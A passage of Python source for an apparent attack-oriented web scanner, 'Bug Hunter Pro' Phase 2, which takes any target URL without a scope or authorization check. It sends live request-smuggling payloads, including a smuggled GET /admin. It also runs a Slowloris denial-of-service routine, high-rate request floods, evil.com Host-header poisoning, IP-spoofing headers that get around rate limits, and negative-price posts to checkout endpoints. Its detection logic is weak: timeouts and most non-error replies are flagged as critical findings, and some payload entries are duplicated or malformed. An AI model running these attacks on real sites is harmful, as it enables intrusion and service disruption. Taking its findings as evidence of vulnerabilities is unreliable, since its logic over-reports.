                            "evidence": f"Cache HIT for variation. Cache status: {cache_status}",
                            "confidence": "medium"
                        })
            
            except Exception as e:
                continue
        
        return findings
    
    async def test_x_forwarded_host(self, url: str) -> List[Dict[str, Any]]:
        """Test X-Forwarded-Host header poisoning"""
        findings = []
        
        test_hosts = [
            "evil.com",
            "localhost",
            "127.0.0.1",
            "attacker-controlled.com"
        ]
        
        for host in test_hosts:
            try:
                headers = {"X-Forwarded-Host": host}
                
                async with self.engine.session.get(url, headers=headers) as response:
                    body = await response.text()
                    
                    # Check if host is reflected
                    if host in body:
                        # Check for dangerous reflections
                        if any(pattern in body for pattern in 
                              ['src="//', 'href="//', 'url("//', 'action="//']):
                            findings.append({
                                "title": "X-Forwarded-Host Cache Poisoning",
                                "description": "X-Forwarded-Host header reflected in dangerous contexts",
                                "severity": "high",
                                "url": url,
                                "header": f"X-Forwarded-Host: {host}",
                                "evidence": f"Host reflected in URLs/links: {host}",
                                "confidence": "high"
                            })
                        else:
                            findings.append({
                                "title": "X-Forwarded-Host Reflection",
                                "description": "X-Forwarded-Host header reflected in response",
                                "severity": "medium",
                                "url": url,
                                "header": f"X-Forwarded-Host: {host}",
                                "evidence": f"Host reflected in response: {host}",
                                "confidence": "high"
                            })
            
            except Exception as e:
                continue
        
        return findings
    
    async def test_cache_deception(self, url: str) -> List[Dict[str, Any]]:
        """Test for cache deception vulnerabilities"""
        findings = []
        
        # Test path confusion
        test_paths = [
            f"{url.rstrip('/')}/.css",
            f"{url.rstrip('/')}/.js",
            f"{url.rstrip('/')}/.png",
            f"{url.rstrip('/')}/style.css",
            f"{url.rstrip('/')}/script.js",
            f"{url.rstrip('/')}/image.png",
            f"{url.rstrip('/')}/test.js",
        ]
        
        for test_path in test_paths:
            try:
                async with self.engine.session.get(test_path) as response:
                    content_type = response.headers.get("content-type", "")
                    
                    # Check if non-static URL returns static content-type
                    if any(ct in content_type for ct in ["text/css", "application/javascript", "image/"]):
                        if response.status == 200:
                            findings.append({
                                "title": "Cache Deception Vulnerability",
                                "description": "Dynamic page served with static content-type",
                                "severity": "medium",
                                "url": test_path,
                                "evidence": f"URL returns content-type: {content_type}",
                                "confidence": "medium"
                            })
            
            except Exception as e:
                continue
        
        return findings

# ============================================================================
# HTTP REQUEST SMUGGLING MODULE
# ============================================================================

class HTTPRequestSmugglingTester:
    """HTTP Request Smuggling testing module"""
    
    def __init__(self, engine):
        self.engine = engine
    
    async def test_request_smuggling(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for HTTP Request Smuggling vulnerabilities"""
        print("  [+] Testing HTTP Request Smuggling...")
        
        findings = []
        
        # Test key endpoints (POST endpoints are best)
        post_endpoints = []
        for endpoint in endpoints:
            if endpoint.get("forms"):
                post_endpoints.append(endpoint["url"])
        
        if not post_endpoints:
            post_endpoints = [endpoints[0]["url"]] if endpoints else []
        
        for url in post_endpoints[:5]:  # Limit to 5 endpoints
            endpoint_findings = await self.test_smuggling_techniques(url)
            findings.extend(endpoint_findings)
        
        return findings
    
    async def test_smuggling_techniques(self, url: str) -> List[Dict[str, Any]]:
        """Test various HTTP request smuggling techniques"""
        findings = []
        
        print(f"    [+] Testing smuggling: {url}")
        
        # Test CL.TE (Frontend uses Content-Length, backend uses Transfer-Encoding)
        clte_findings = await self.test_cl_te(url)
        findings.extend(clte_findings)
        
        # Test TE.CL (Frontend uses Transfer-Encoding, backend uses Content-Length)
        tecl_findings = await self.test_te_cl(url)
        findings.extend(tecl_findings)
        
        # Test TE.TE with obfuscation
        tete_findings = await self.test_te_te(url)
        findings.extend(tete_findings)
        
        return findings
    
    async def test_cl_te(self, url: str) -> List[Dict[str, Any]]:
        """Test CL.TE smuggling"""
        findings = []
        
        # Craft CL.TE smuggling request
        smuggling_request = (
            f"POST {urlparse(url).path or '/'} HTTP/1.1\r\n"
            f"Host: {urlparse(url).netloc}\r\n"
            "Content-Length: 44\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "\r\n"
        )
        
        try:
            # Send raw socket request
            hostname = urlparse(url).netloc
            port = 443 if url.startswith("https://") else 80
            
            reader, writer = await asyncio.open_connection(hostname, port, ssl=url.startswith("https://"))
            
            writer.write(smuggling_request.encode())
            await writer.drain()
            
            # Read response
            try:
                response = await asyncio.wait_for(reader.read(4096), timeout=10)
                response_text = response.decode('utf-8', errors='ignore')
                
                # Check for interesting responses
                if "405" not in response_text and "400" not in response_text:
                    # Got a non-error response - might be vulnerable
                    findings.append({
                        "title": "HTTP Request Smuggling (CL.TE)",
                        "description": "Content-Length vs Transfer-Encoding desync",
                        "severity": "critical",
                        "url": url,
                        "evidence": f"Received response: {response_text[:200]}",
                        "confidence": "medium"
                    })
            
            except asyncio.TimeoutError:
                # Timeout might indicate request was smuggled
                findings.append({
                    "title": "Potential HTTP Request Smuggling (CL.TE)",
                    "description": "Request caused timeout - possible smuggling",
                    "severity": "high",
                    "url": url,
                    "evidence": "Request caused connection timeout",
                    "confidence": "low"
                })
            
            writer.close()
            await writer.wait_closed()
        
        except Exception as e:
            pass
        
        return findings
    
    async def test_te_cl(self, url: str) -> List[Dict[str, Any]]:
        """Test TE.CL smuggling"""
        findings = []
        
        # Craft TE.CL smuggling request
        smuggling_request = (
            f"POST {urlparse(url).path or '/'} HTTP/1.1\r\n"
            f"Host: {urlparse(url).netloc}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        )
        
        try:
            hostname = urlparse(url).netloc
            port = 443 if url.startswith("https://") else 80
            
            reader, writer = await asyncio.open_connection(hostname, port, ssl=url.startswith("https://"))
            
            writer.write(smuggling_request.encode())
            await writer.drain()
            
            try:
                response = await asyncio.wait_for(reader.read(4096), timeout=10)
                response_text = response.decode('utf-8', errors='ignore')
                
                if "405" not in response_text and "400" not in response_text:
                    findings.append({
                        "title": "HTTP Request Smuggling (TE.CL)",
                        "description": "Transfer-Encoding vs Content-Length desync",
                        "severity": "critical",
                        "url": url,
                        "evidence": f"Received response: {response_text[:200]}",
                        "confidence": "medium"
                    })
            
            except asyncio.TimeoutError:
                findings.append({
                    "title": "Potential HTTP Request Smuggling (TE.CL)",
                    "description": "Request caused timeout - possible smuggling",
                    "severity": "high",
                    "url": url,
                    "evidence": "Request caused connection timeout",
                    "confidence": "low"
                })
            
            writer.close()
            await writer.wait_closed()
        
        except Exception as e:
            pass
        
        return findings
    
    async def test_te_te(self, url: str) -> List[Dict[str, Any]]:
        """Test TE.TE smuggling with obfuscation"""
        findings = []
        
        # List of obfuscated Transfer-Encoding headers
        obfuscated_te_headers = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: x",
            "Transfer-Encoding:[tab]chunked",
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked",
            "X: X\\nTransfer-Encoding: chunked",
            "Transfer-Encoding\n: chunked",
        ]
        
        for te_header in obfuscated_te_headers:
            smuggling_request = (
                f"POST {urlparse(url).path or '/'} HTTP/1.1\r\n"
                f"Host: {urlparse(url).netloc}\r\n"
                "Content-Length: 4\r\n"
                f"{te_header}\r\n"
                "\r\n"
                "5c\r\n"
                "GPOST / HTTP/1.1\r\n"
                "Content-Length: 15\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
            )
            
            try:
                hostname = urlparse(url).netloc
                port = 443 if url.startswith("https://") else 80
                
                reader, writer = await asyncio.open_connection(hostname, port, ssl=url.startswith("https://"))
                
                writer.write(smuggling_request.encode())
                await writer.drain()
                
                try:
                    response = await asyncio.wait_for(reader.read(4096), timeout=10)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    if "400" not in response_text and "Illegal" not in response_text:
                        findings.append({
                            "title": "HTTP Request Smuggling (TE.TE)",
                            "description": f"Obfuscated Transfer-Encoding: {te_header}",
                            "severity": "critical",
                            "url": url,
                            "evidence": f"Received response with obfuscated TE header",
                            "confidence": "medium"
                        })
                        break
                
                except asyncio.TimeoutError:
                    findings.append({
                        "title": "Potential HTTP Request Smuggling (TE.TE)",
                        "description": f"Obfuscated TE header caused timeout: {te_header}",
                        "severity": "high",
                        "url": url,
                        "evidence": "Request with obfuscated TE header caused timeout",
                        "confidence": "low"
                    })
                
                writer.close()
                await writer.wait_closed()
            
            except Exception as e:
                continue
        
        return findings

# ============================================================================
# BUSINESS LOGIC TESTER
# ============================================================================

class BusinessLogicTester:
    """Business Logic Vulnerability Testing"""
    
    def __init__(self, engine):
        self.engine = engine
        
    async def test_business_logic(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for business logic vulnerabilities"""
        print("  [+] Testing Business Logic Vulnerabilities...")
        
        findings = []
        
        # Test price manipulation
        price_findings = await self.test_price_manipulation(endpoints)
        findings.extend(price_findings)
        
        # Test quantity manipulation
        quantity_findings = await self.test_quantity_manipulation(endpoints)
        findings.extend(quantity_findings)
        
        # Test race conditions
        race_findings = await self.test_race_conditions(endpoints)
        findings.extend(race_findings)
        
        # Test workflow bypass
        workflow_findings = await self.test_workflow_bypass(endpoints)
        findings.extend(workflow_findings)
        
        return findings
    
    async def test_price_manipulation(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for price manipulation vulnerabilities"""
        findings = []
        
        # Look for checkout/cart endpoints
        cart_endpoints = []
        for endpoint in endpoints:
            url = endpoint["url"].lower()
            if any(keyword in url for keyword in 
                  ["/cart", "/checkout", "/order", "/payment", "/buy", "/purchase"]):
                cart_endpoints.append(endpoint)
        
        for endpoint in cart_endpoints[:5]:
            url = endpoint["url"]
            
            # Check if endpoint accepts price parameters
            params = endpoint.get("parameters", [])
            
            price_params = []
            for param in params:
                param_name = param["name"].lower()
                if any(keyword in param_name for keyword in 
                      ["price", "amount", "total", "cost", "value"]):
                    price_params.append(param["name"])
            
            if price_params:
                # Test negative price
                for param_name in price_params:
                    test_url = self._inject_payload(url, param_name, "-1")
                    
                    try:
                        async with self.engine.session.post(test_url, timeout=10) as response:
                            if response.status in [200, 201]:
                                findings.append({
                                    "title": "Price Manipulation",
                                    "description": f"Parameter '{param_name}' accepts negative values",
                                    "severity": "critical",
                                    "url": test_url,
                                    "evidence": f"Accepted negative price in parameter '{param_name}'",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_quantity_manipulation(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for quantity manipulation vulnerabilities"""
        findings = []
        
        # Look for quantity parameters
        for endpoint in endpoints[:10]:
            url = endpoint["url"]
            params = endpoint.get("parameters", [])
            
            quantity_params = []
            for param in params:
                param_name = param["name"].lower()
                if any(keyword in param_name for keyword in 
                      ["quantity", "qty", "amount", "count", "number"]):
                    quantity_params.append(param["name"])
            
            if quantity_params:
                # Test negative quantity
                for param_name in quantity_params:
                    test_url = self._inject_payload(url, param_name, "-1")
                    
                    try:
                        async with self.engine.session.post(test_url, timeout=10) as response:
                            if response.status in [200, 201]:
                                findings.append({
                                    "title": "Quantity Manipulation",
                                    "description": f"Parameter '{param_name}' accepts negative values",
                                    "severity": "high",
                                    "url": test_url,
                                    "evidence": f"Accepted negative quantity in parameter '{param_name}'",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
                
                # Test large quantity (integer overflow)
                for param_name in quantity_params:
                    test_url = self._inject_payload(url, param_name, "999999999")
                    
                    try:
                        async with self.engine.session.post(test_url, timeout=10) as response:
                            if response.status in [200, 201]:
                                findings.append({
                                    "title": "Large Quantity Acceptance",
                                    "description": f"Parameter '{param_name}' accepts extremely large values",
                                    "severity": "medium",
                                    "url": test_url,
                                    "evidence": f"Accepted very large quantity in parameter '{param_name}'",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_race_conditions(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for race condition vulnerabilities"""
        findings = []
        
        # Look for endpoints that might be vulnerable to race conditions
        # e.g., coupon application, limited stock, one-time actions
        
        vulnerable_patterns = [
            "/apply-coupon", "/coupon", "/discount",
            "/redeem", "/claim", "/use",
            "/limited", "/stock", "/inventory"
        ]
        
        race_endpoints = []
        for endpoint in endpoints:
            url = endpoint["url"].lower()
            if any(pattern in url for pattern in vulnerable_patterns):
                race_endpoints.append(endpoint)
        
        for endpoint in race_endpoints[:3]:
            url = endpoint["url"]
            
            # Test by sending multiple concurrent requests
            print(f"    [+] Testing race condition: {url}")
            
            async def make_request(req_num):
                try:
                    async with self.engine.session.post(url, timeout=10) as response:
                        return req_num, response.status, await response.text()
                except:
                    return req_num, None, None
            
            # Send 10 concurrent requests
            tasks = [make_request(i) for i in range(10)]
            results = await asyncio.gather(*tasks)
            
            # Analyze results
            successful = 0
            for req_num, status, body in results:
                if status in [200, 201]:
                    successful += 1
            
            if successful > 5:  # More than half succeeded
                findings.append({
                    "title": "Potential Race Condition",
                    "description": "Endpoint may be vulnerable to race conditions",
                    "severity": "medium",
                    "url": url,
                    "evidence": f"{successful}/10 concurrent requests succeeded",
                    "confidence": "low"
                })
        
        return findings
    
    async def test_workflow_bypass(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for workflow bypass vulnerabilities"""
        findings = []
        
        # Common workflow bypass patterns
        test_cases = [
            # Skip steps
            ("/checkout/step1", "/checkout/step3", "Checkout step skipping"),
            # Access completed steps
            ("/wizard/step2", "/wizard/step1", "Backward navigation in wizard"),
            # Direct access to final step
            ("/process/start", "/process/complete", "Direct access to completion"),
        ]
        
        for from_step, to_step, description in test_cases:
            # Find matching endpoints
            for endpoint in endpoints:
                url = endpoint["url"]
                if from_step in url:
                    # Try to access to_step
                    target_url = url.replace(from_step, to_step)
                    
                    try:
                        async with self.engine.session.get(target_url, timeout=10) as response:
                            if response.status in [200, 302]:
                                findings.append({
                                    "title": "Workflow Bypass",
                                    "description": description,
                                    "severity": "medium",
                                    "url": target_url,
                                    "evidence": f"Accessed {to_step} directly from {from_step}",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        query = parsed.query
        
        if query:
            new_query = []
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    if key == param_name:
                        new_query.append(f"{key}={quote(payload)}")
                    else:
                        new_query.append(param)
                else:
                    new_query.append(param)
            
            new_query_str = '&'.join(new_query)
            return url.replace(query, new_query_str)
        else:
            return f"{url}?{param_name}={quote(payload)}"

# ============================================================================
# RATE LIMITING TESTER
# ============================================================================

class RateLimitingTester:
    """Rate Limiting and DDoS Testing"""
    
    def __init__(self, engine):
        self.engine = engine
        
    async def test_rate_limiting(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for rate limiting vulnerabilities"""
        print("  [+] Testing Rate Limiting...")
        
        findings = []
        
        # Test key endpoints
        test_endpoints = endpoints[:10]
        
        for endpoint in test_endpoints:
            url = endpoint["url"]
            
            print(f"    [+] Testing rate limits: {url}")
            
            # Test standard rate limiting
            rate_findings = await self.test_standard_rate_limits(url)
            findings.extend(rate_findings)
            
            # Test authentication bypass for rate limits
            auth_findings = await self.test_auth_bypass_rate_limits(url)
            findings.extend(auth_findings)
            
            # Test slowloris attack
            slowloris_findings = await self.test_slowloris(url)
            findings.extend(slowloris_findings)
        
        return findings
    
    async def test_standard_rate_limits(self, url: str) -> List[Dict[str, Any]]:
        """Test standard rate limiting"""
        findings = []
        
        # Send rapid requests
        requests_per_second = 50
        duration = 5  # seconds
        
        print(f"      [+] Sending {requests_per_second} requests/second for {duration}s")
        
        success_count = 0
        block_count = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            batch_start = time.time()
            
            # Send batch of requests
            batch_tasks = []
            for i in range(requests_per_second):
                batch_tasks.append(self._make_rate_limit_request(url))
            
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                if isinstance(result, tuple):
                    status, _ = result
                    if status in [200, 201, 302]:
                        success_count += 1
                    elif status in [429, 503]:  # Rate limited
                        block_count += 1
            
            # Wait for next second
            elapsed = time.time() - batch_start
            if elapsed < 1:
                await asyncio.sleep(1 - elapsed)
        
        total_requests = success_count + block_count
        success_rate = (success_count / total_requests) * 100 if total_requests > 0 else 0
        
        if success_rate > 80:  # More than 80% success
            findings.append({
                "title": "Missing or Weak Rate Limiting",
                "description": "Endpoint lacks effective rate limiting",
                "severity": "medium",
                "url": url,
                "evidence": f"{success_count}/{total_requests} requests succeeded ({success_rate:.1f}%)",
                "confidence": "high"
            })
        
        elif block_count == 0:
            findings.append({
                "title": "No Rate Limiting Detected",
                "description": "No rate limiting headers or status codes observed",
                "severity": "low",
                "url": url,
                "evidence": f"No 429/503 responses in {total_requests} requests",
                "confidence": "medium"
            })
        
        return findings
    
    async def _make_rate_limit_request(self, url: str) -> Tuple[int, Dict]:
        """Make a single rate limit test request"""
        try:
            async with self.engine.session.get(url, timeout=5) as response:
                return response.status, dict(response.headers)
        except:
            return 0, {}
    
    async def test_auth_bypass_rate_limits(self, url: str) -> List[Dict[str, Any]]:
        """Test rate limiting authentication bypass"""
        findings = []
        
        # Test with different IP headers
        ip_headers = [
            {"X-Forwarded-For": "10.0.0.1"},
            {"X-Real-IP": "10.0.0.2"},
            {"X-Forwarded-For": "10.0.0.3, 10.0.0.4"},
            {"CF-Connecting-IP": "10.0.0.5"},
        ]
        
        success_counts = {}
        
        for headers in ip_headers:
            ip_key = list(headers.values())[0]
            success_counts[ip_key] = 0
            
            # Send 10 rapid requests with this IP
            for i in range(10):
                try:
                    async with self.engine.session.get(url, headers=headers, timeout=5) as response:
                        if response.status in [200, 201]:
                            success_counts[ip_key] += 1
                except:
                    pass
            
            await asyncio.sleep(0.1)  # Small delay between IPs
        
        # Check if all IPs got similar success rates
        if len(success_counts) > 0:
            avg_success = sum(success_counts.values()) / len(success_counts)
            
            # If average success is high, rate limiting might be IP-based but bypassable
            if avg_success >= 8:  # 8/10 requests succeeded per IP
                findings.append({
                    "title": "IP-Based Rate Limiting Bypass",
                    "description": "Rate limiting based on IP can be bypassed with headers",
                    "severity": "medium",
                    "url": url,
                    "evidence": f"Multiple IPs bypassed rate limits. Success rates: {success_counts}",
                    "confidence": "medium"
                })
        
        return findings
    
    async def test_slowloris(self, url: str) -> List[Dict[str, Any]]:
        """Test for Slowloris vulnerability"""
        findings = []
        
        parsed = urlparse(url)
        hostname = parsed.netloc
        path = parsed.path or "/"
        port = 443 if url.startswith("https://") else 80
        
        print(f"      [+] Testing Slowloris: {hostname}:{port}")
        
        try:
            # Create multiple slow connections
            connections = []
            
            for i in range(10):
                try:
                    if url.startswith("https://"):
                        ssl_context = ssl.create_default_context()
                        ssl_context.check_hostname = False
                        ssl_context.verify_mode = ssl.CERT_NONE
                        reader, writer = await asyncio.open_connection(
                            hostname, port, ssl=ssl_context
                        )
                    else:
                        reader, writer = await asyncio.open_connection(hostname, port)
                    
                    # Send partial request
                    request = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {hostname}\r\n"
                        "Content-Length: 1000000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    connections.append((reader, writer))
                    
                except Exception as e:
                    continue
            
            # Keep connections open for a while
            await asyncio.sleep(30)
            
            # Check if connections are still open
            still_open = 0
            for reader, writer in connections:
                try:
                    writer.write(b"X")  # Send one more byte
                    await writer.drain()
                    still_open += 1
                except:
                    pass
            
            # Clean up
            for reader, writer in connections:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
            
            if still_open >= 5:  # At least 5 connections still open
                findings.append({
                    "title": "Slowloris Vulnerability",
                    "description": "Server vulnerable to Slowloris DoS attack",
                    "severity": "medium",
                    "url": url,
                    "evidence": f"{still_open}/10 slow connections kept open for 30 seconds",
                    "confidence": "medium"
                })
        
        except Exception as e:
            pass
        
        return findings

# ============================================================================
# DNS REBINDING TESTER
# ============================================================================

class DNSRebindingTester:
    """DNS Rebinding Testing"""
    
    def __init__(self, engine):
        self.engine = engine
        
    async def test_dns_rebinding(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test for DNS rebinding vulnerabilities"""
        print("  [+] Testing DNS Rebinding...")
        
        findings = []
        
        # Look for endpoints that might be vulnerable
        # e.g., internal APIs, admin interfaces
        
        vulnerable_patterns = [
            "/internal/", "/admin/", "/api/internal",
            "/management/", "/actuator/", "/debug/",
            "/phpmyadmin/", "/cpanel/", "/webmin/"
        ]
        
        for endpoint in endpoints[:5]:
            url = endpoint["url"]
            
            for pattern in vulnerable_patterns:
                if pattern in url:
                    # Test for lack of Host validation
                    host_findings = await self.test_host_validation(url)
                    findings.extend(host_findings)
                    break
        
        # Also test main target
        main_findings = await self.test_host_validation(self.engine.config.target)
        findings.extend(main_findings)
        
        return findings
    
    async def test_host_validation(self, url: str) -> List[Dict[str, Any]]:
        """Test for proper Host header validation"""
        findings = []
        
        test_hosts = [
            "localhost",
            "127.0.0.1",
            "0.0.0.0",
            "[::1]",
            "169.254.169.254",  # AWS metadata
            "metadata.google.internal",  # GCP metadata
        ]
        
        for test_host in test_hosts:
            headers = {"Host": test_host}
            
            try:
                async with self.engine.session.get(url, headers=headers, timeout=10) as response:
                    if response.status in [200, 302, 401, 403]:
                        # Got a response - might be vulnerable
                        findings.append({
                            "title": "DNS Rebinding Vulnerability",
                            "description": f"Server responds to Host: {test_host}",
                            "severity": "high",
                            "url": url,
                            "evidence": f"Responded to Host header: {test_host} with status {response.status}",
                            "confidence": "medium"
                        })
            
            except Exception as e:
                pass
        
        return findings

# ============================================================================
# INTEGRATION INTO MAIN ENGINE
# ============================================================================

# Add these new modules to the BugHunterPro class

class BugHunterProEnhanced(BugHunterPro):
    """Enhanced BugHunterPro with Phase 2 modules"""
    
    def __init__(self, config: ScanConfig):
        super().__init__(config)
        
        # Add Phase 2 modules
        self.modules.update({
            "websocket": WebSocketTester(self),
            "graphql": GraphQLExploiter(self),
            "cache_poisoning": WebCachePoisoningTester(self),
            "request_smuggling": HTTPRequestSmugglingTester(self),
            "business_logic": BusinessLogicTester(self),
            "rate_limiting": RateLimitingTester(self),
            "dns_rebinding": DNSRebindingTester(self)
        })
    
    async def run_full_assessment(self):
        """Run complete security assessment with Phase 2 modules"""
        self.stats["start_time"] = datetime.now()
        
        try:
            await self.init_session()
            
            print(f"[+] Target: {self.config.target}")
            print(f"[+] Mode: {self.config.mode.value}")
            print(f"[+] Starting comprehensive security assessment...\n")
            
            # ==================== PHASE 1: RECONNAISSANCE ====================
            print("[1/9] 🔍 RECONNAISSANCE PHASE")
            print("-" * 50)
            
            assets = await self.modules["recon"].run()
            
            # ==================== PHASE 2: CRAWLING ====================
            print("\n[2/9] 🕷️  CRAWLING & MAPPING")
            print("-" * 50)
            
            endpoints = await self.modules["crawler"].crawl(assets)
            
            # ==================== PHASE 3: BASIC VULNERABILITY SCANNING ====================
            print("\n[3/9] ⚡ BASIC VULNERABILITY SCANNING")
            print("-" * 50)
            
            vuln_findings = await self.modules["scanner"].scan(endpoints)
            self.results.extend(vuln_findings)
            
            # ==================== PHASE 4: API SECURITY TESTING ====================
            print("\n[4/9] 🔗 API SECURITY TESTING")
            print("-" * 50)
            
            api_findings = await self.modules["api_tester"].test(endpoints)
            self.results.extend(api_findings)
            
            # ==================== PHASE 5: ADVANCED ATTACK TESTING ====================
            print("\n[5/9] 🚀 ADVANCED ATTACK TESTING")
            print("-" * 50)
            
            # WebSocket testing
            ws_findings = await self.modules["websocket"].test_websockets(endpoints)
            self.results.extend(ws_findings)
            
            # GraphQL exploitation
            graphql_findings = await self.modules["graphql"].exploit_graphql(endpoints)
            self.results.extend(graphql_findings)
            
            # Web cache poisoning
            cache_findings = await self.modules["cache_poisoning"].test_cache_poisoning(endpoints)
            self.results.extend(cache_findings)
            
            # HTTP request smuggling
            smuggling_findings = await self.modules["request_smuggling"].test_request_smuggling(endpoints)
            self.results.extend(smuggling_findings)
            
            # ==================== PHASE 6: BUSINESS LOGIC TESTING ====================
            print("\n[6/9] 🧠 BUSINESS LOGIC TESTING")
            print("-" * 50)
            
            logic_findings = await self.modules["business_logic"].test_business_logic(endpoints)
            self.results.extend(logic_findings)
            
            # ==================== PHASE 7: RATE LIMITING TESTING ====================
            print("\n[7/9] ⏰ RATE LIMITING TESTING")
            print("-" * 50)
            
            rate_findings = await self.modules["rate_limiting"].test_rate_limiting(endpoints)
            self.results.extend(rate_findings)
            
            # ==================== PHASE 8: DNS REBINDING TESTING ====================
            print("\n[8/9] 🌐 DNS REBINDING TESTING")
            print("-" * 50)
            
            dns_findings = await self.modules["dns_rebinding"].test_dns_rebinding(endpoints)
            self.results.extend(dns_findings)
            
            # ==================== PHASE 9: REPORT GENERATION ====================
            print("\n[9/9] 📊 GENERATING REPORTS")
            print("-" * 50)
            
            await self.modules["report"].generate(self.results)
            
            self.stats["end_time"] = datetime.now()
            self.stats["vulnerabilities_found"] = len(self.results)
            
            self.print_summary()
            
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
        except Exception as e:
            print(f"\n[!] Scan failed: {str(e)}")
            import traceback
            traceback.print_exc()
        finally:
            await self.close_session()

# ============================================================================
# INSTALLATION REQUIREMENTS
# ============================================================================

def check_requirements():
    """Check and install required packages for Phase 2"""
    requirements = {
        "websockets": "pip install websockets",
        "dnspython": "pip install dnspython",
        "aiohttp": "pip install aiohttp",
        "pyjwt": "pip install pyjwt (for JWT testing)",
        "weasyprint": "pip install weasyprint (for PDF reports)",
        "markdown": "pip install markdown (for PDF reports)"
    }
    
    missing = []
    for package, install_cmd in requirements.items():
        try:
            if package == "websockets":
                import websockets
            elif package == "dnspython":
                import dns.resolver
            elif package == "aiohttp":
                import aiohttp
            elif package == "pyjwt":
                import jwt as pyjwt
            elif package == "weasyprint":
                from weasyprint import HTML
            elif package == "markdown":
                import markdown
        except ImportError:
            missing.append((package, install_cmd))
    
    if missing:
        print("[!] Missing packages for Phase 2 features:")
        for package, install_cmd in missing:
            print(f"    {package}: {install_cmd}")
        print("\n[+] Some features will be disabled without these packages")
    
    return len(missing) == 0

# ============================================================================
# MAIN ENTRY POINT FOR PHASE 2
# ============================================================================

async def main_phase2():
    """Main entry point with Phase 2 features"""
    parser = argparse.ArgumentParser(
        description="Bug Hunter Pro v2.1 - Phase 2: Advanced Attack Modules",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Advanced Features in Phase 2:
  • WebSocket Security Testing
  • GraphQL Exploitation
  • Web Cache Poisoning
  • HTTP Request Smuggling
  • Business Logic Testing
  • Rate Limiting/DDoS Testing
  • DNS Rebinding Testing

Examples:
  %(prog)s -t https://example.com --advanced
  %(prog)s -t https://example.com -m deep --all-modules
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("-m", "--mode", choices=["fast", "normal", "deep", "aggressive"], 
                       default="normal", help="Scan mode (default: normal)")
    parser.add_argument("--advanced", action="store_true", help="Enable advanced Phase 2 modules")
    parser.add_argument("--all-modules", action="store_true", help="Enable all testing modules")
    parser.add_argument("--skip-basic", action="store_true", help="Skip basic vulnerability scanning")
    parser.add_argument("-w", "--workers", type=int, default=100, 
                       help="Maximum concurrent workers (default: 100)")
    
    args = parser.parse_args()
    
    # Check requirements
    if args.advanced or args.all_modules:
        check_requirements()
    
    # Create config
    config = ScanConfig(
        target=args.target,
        mode=ScanMode(args.mode),
        max_concurrent=args.workers
    )
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║               BUG HUNTER PRO v2.1                        ║
║           Phase 2: Advanced Attack Modules               ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    # Create and run enhanced scanner
    if args.advanced or args.all_modules:
        scanner = BugHunterProEnhanced(config)
    else:
        scanner = BugHunterPro(config)
    
    await scanner.run_full_assessment()

if __name__ == "__main__":
    asyncio.run(main_phase2())
